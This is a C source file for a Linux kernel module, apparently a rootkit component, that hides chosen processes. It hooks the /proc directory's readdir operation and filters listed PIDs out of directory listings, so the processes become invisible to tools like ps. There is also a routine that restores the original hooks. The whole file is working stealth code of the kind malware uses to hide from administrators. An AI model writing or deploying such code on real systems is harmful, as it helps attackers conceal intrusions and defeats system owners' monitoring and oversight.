#include <linux/moduleparam.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/types.h>
#include <linux/namei.h>

#include "sysmap.h"
#include "process_hiding.h"

#define MAX_PIDC 255
#define MAX_PID_LEN 6
static char pid_array[MAX_PIDC][MAX_PID_LEN];
static int hide_pid[MAX_PIDC];
static int pid_argc,pidc;
static int is_hidden = 0;

struct inode *proc_inode;
static struct file_operations my_fops;
const static struct file_operations *original_fops=0;
filldir_t proc_fill_dir;

module_param_array(hide_pid, int, &pid_argc, 0);
MODULE_PARM_DESC(hide_pid, "Array of PIDs");

struct inode * get_proc_inode(void);
static int readdir_proc (struct file*, void*, filldir_t);
static void hide_proc_tree(void);
static int my_filldir_t (void *, const char *, int, loff_t, u64, unsigned);

struct inode * get_proc_inode(void)
{
	struct path proc_path;
	if(kern_path("/proc/", 0, &proc_path))
		return NULL;
	
	return proc_path.dentry->d_inode;
}

static int readdir_proc( struct file* f, void * a, filldir_t t){
	proc_fill_dir = t;
	
	return original_fops->readdir(f, a, my_filldir_t);
}

static int my_filldir_t (void * __buf, const char * name, int namelen, loff_t offset, u64 ino, unsigned d_type){
	int i;
	for(i=0; i < pidc; i++){
		if(strcmp(pid_array[i], name) == 0){
			return 0;
		}
	}
	return proc_fill_dir(__buf,name,namelen,offset,ino,d_type);
}

static void hide_proc_tree(){
	proc_inode = get_proc_inode();
	if(proc_inode == NULL){
		printk(KERN_INFO "Couldn't obtain proc inode\n");
	}
	else{
		original_fops = proc_inode->i_fop;
		my_fops = *proc_inode->i_fop;
		my_fops.readdir = readdir_proc;
		proc_inode->i_fop = &my_fops;
		is_hidden = 1;
	}
}

void hide_process(int pid){
	if(pidc < MAX_PIDC){
		hide_pid[pidc] = pid;
		snprintf(pid_array[pidc], MAX_PID_LEN, "%d", pid); //since we don't have itoa
		pidc++;
	}
}

void hide_processes(){
	int i;
	
	for(i=0; i< pid_argc; i++){
		hide_process(hide_pid[i]);
	}
	hide_proc_tree();
} 

void unhide_processes(void){
	if(is_hidden == 1){
		proc_inode->i_fop = original_fops;
		is_hidden = 0;
	}
}

